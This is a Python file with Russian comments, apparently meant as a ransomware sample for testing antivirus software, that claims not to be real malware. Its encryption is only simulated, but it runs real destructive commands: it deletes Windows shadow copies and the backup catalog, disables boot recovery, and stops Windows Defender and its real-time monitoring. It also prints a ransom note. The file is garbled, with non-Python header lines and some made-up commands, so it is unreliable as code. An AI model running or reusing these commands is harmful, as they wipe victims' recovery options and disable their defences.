#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TEST MALWARE SAMPLE - RANSOMWARE SIMULATION
Это тестовый образец вируса-шифровальщика для проверки антивируса
НЕ ЯВЛЯЕТСЯ РЕАЛЬНЫМ ВРЕДОНОСНЫМ ПО
"""

THREAT_TYPE: RANSOMWARE
GENERATED: 2024-01-01
RANDOM_ID: TEST_RANSOM_001

[MALICIOUS_INDICATORS]
- File encryption behavior
- Bitcoin ransom demand
- Shadow copy deletion

[SIGNATURE]
RANSOMWARE_TEST_SIGNATURE_V1

def encrypt_files():
    """Симуляция шифрования файлов"""
    # CryptEncrypt - шифрование файлов
    target_extensions = ['.doc', '.xls', '.pdf', '.jpg', '.png']
    
    for ext in target_extensions:
        print(f"Encrypting *{ext} files...")
        # Симуляция шифрования
        with open(f"file{ext}.locked", "w") as f:
            f.write("ENCRYPTED BY RANSOMWARE")
    
    # Удаление теневых копий Windows
    import subprocess
    subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
    subprocess.run("wmic shadowcopy delete", shell=True)
    subprocess.run("bcdedit /set {default} recoveryenabled no", shell=True)
    subprocess.run("wbadmin delete catalog -quiet", shell=True)

def show_ransom_note():
    """Показ уведомления о выкупе"""
    ransom_message = """
    !!! YOUR FILES HAVE BEEN ENCRYPTED !!!
    
    Send 1 BTC to: 1A2B3C4D5E6F7G8H9I0J
    
    To decrypt your files, send bitcoin and contact us.
    your files encrypted bitcoin decrypt
    """
    print(ransom_message)

def disable_defender():
    """Отключение защитника Windows"""
    import subprocess
    # Отключение Windows Defender
    subprocess.run("sc stop WinDefend", shell=True)
    subprocess.run("StopService Windows Defender", shell=True)
    subprocess.run("Set-MpPreference -DisableRealtimeMonitoring $true", shell=True)
    subprocess.run("RegSetValue DisableRealtimeMonitoring 1", shell=True)

if __name__ == "__main__":
    print("=== RANSOMWARE SIMULATION ===")
    encrypt_files()
    show_ransom_note()
    disable_defender()
    print("=== END SIMULATION ===")
